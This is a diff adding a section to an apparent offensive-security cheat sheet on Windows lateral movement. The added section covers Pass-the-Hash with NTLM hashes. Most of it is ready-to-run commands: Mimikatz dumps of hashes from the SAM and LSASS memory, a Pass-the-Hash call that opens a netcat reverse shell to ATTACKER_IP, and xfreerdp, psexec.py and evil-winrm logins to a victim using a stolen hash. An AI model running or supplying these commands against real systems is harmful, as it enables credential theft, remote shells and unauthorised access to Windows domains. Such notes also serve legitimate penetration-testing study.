@@ -143,8 +143,32 @@ wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Wind
 ```
 
 # 6-Alternative for plain-text passwords:
+## 6.1 NTLM-hash:
 - **Note**: 
     - the NTLM challenge sent during authentication can be responded to just by knowing the password hash.
     - This means we can authenticate without requiring the plaintext password to be known. Instead of having to crack NTLM hashes, 
     - if the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash (PtH) and authenticate successfully.
-- 
+- **Extracting NTLM hashes from local SAM(only local users)**:
+```ps1
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam   
+```
+- **Extracting NTLM hashes from LSASS memory(local and domain users):**
+```ps1
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # sekurlsa::msv 
+```
+- **Pass-The-Hash**:
+```ps1
+mimikatz # token::revert
+mimikatz # sekurlsa::pth /user:<UserName> /domain:<DomainName> /ntlm:<NTLM-hash> /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
+# if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.
+```
+- **Pass-The-Hash using Linux Tools**:
+```
+xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
+````
